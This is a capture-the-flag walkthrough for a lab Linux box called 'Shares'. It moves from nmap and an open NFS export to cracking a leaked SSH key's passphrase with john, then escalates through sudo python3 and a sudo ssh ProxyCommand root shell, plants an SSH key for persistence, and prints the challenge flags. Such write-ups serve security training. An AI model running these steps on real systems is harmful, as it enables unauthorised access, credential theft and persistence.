---
tags: [Beginner, Linux, Video]
title: Shares
created: '2020-05-25T19:25:40.092Z'
modified: '2020-07-02T11:49:42.398Z'
---

# Shares
- IP: `172.31.1.7`
- OS: Linux
## Enumeration
### Writeup
We run NMAP and get all the open ports.

Since we have nfs ports open, we try to figure out if there's any shares we can mount with `showmount`. That shows use that `/home/amir` is accessible to `*.*.*.*`.
Let's try and mount that by executing `mount -t nfs 172.31.1.7:/home/amir /mnt/Shares`. We can now read the files in `/mnt/Shares`.
The folder that is the most interesting is the `.ssh` folder, containing an authorized_keys file and corresponding keys, but we can only read the `.bak` version, which still contains a private key.
We also found ssh running on a higher port. We set the permissions of the key to `700` but when we try to use the private key to log in (`ssh -i id_rsa.bak amir@172.31.1.7 -p 27853`), we get asked for a password, which we currently don't have.
The next idea is to crack the private key with john but first we need to convert the key to a hash with `ssh2john`. After running john on that, we get a password `hello6`, which we can use to log in as amir!
### Commands
#### NMap
- `nmap -p 1-65535 -T4 -A -v 172.31.1.7`
```xml
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
80/tcp    open     http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Pet Shop
111/tcp   open     rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34883/udp   mountd
|   100005  1,2,3      40303/udp6  mountd
|   100005  1,2,3      41611/tcp6  mountd
|   100005  1,2,3      47897/tcp   mountd
|   100021  1,3,4      42653/tcp6  nlockmgr
|   100021  1,3,4      43947/tcp   nlockmgr
|   100021  1,3,4      47799/udp   nlockmgr
|   100021  1,3,4      55090/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open     nfs_acl  3 (RPC #100227)
27853/tcp open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
|_  256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
32195/tcp filtered unknown
37623/tcp open     mountd   1-3 (RPC #100005)
37653/tcp open     mountd   1-3 (RPC #100005)
43947/tcp open     nlockmgr 1-4 (RPC #100021)
47897/tcp open     mountd   1-3 (RPC #100005)
```
#### ShowMount
- `showmount -e 172.31.1.7`
```bash
Export list for 172.31.1.7:
/home/amir *.*.*.*
```
#### Mount
`mount -t nfs 172.31.1.7:/home/amir /mnt/Shares`
#### SSH
`ssh -i id_rsa.bak amir@172.31.1.7 -p 27853`
#### ssh2john
`/usr/share/john/ssh2john.py fromServer/id_rsa.bak > amir_ssh_hash`
#### john
`john --wordlist=/usr/share/wordlists/rockyou.txt amir_ssh_hash`
-> `hello6`

## Enumeration as Amir
### Writeup
We run LinPEAS and immediately notice we're part of the `sudo` group, but sadly, without knowing the current password, that doesn't really help us.
From doing `sudo -l`, we see we can run `pkexec` and `python3` as `amy` and get a shell as her by doing `sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`.

Here we find `access.txt`: `dc17a108efc49710e2fd5450c492231c`
But before we move on, let's built some persistence in by uploading our private key to the server so we can ssh in as `amy`.
### Commands
#### Sudo
- `sudo -l`
```bash
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: 
```
- `sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`

## Enumeration as Amy
### Writeup
We run `sudo -l` and see that we can run `ssh` as `root`.
We can easily get a root shell from the code from [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo)

We can now get `system.txt`: `b910aca7fe5e6fcb5b0d1554f66c1506`
### Commands
#### SSH
- `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
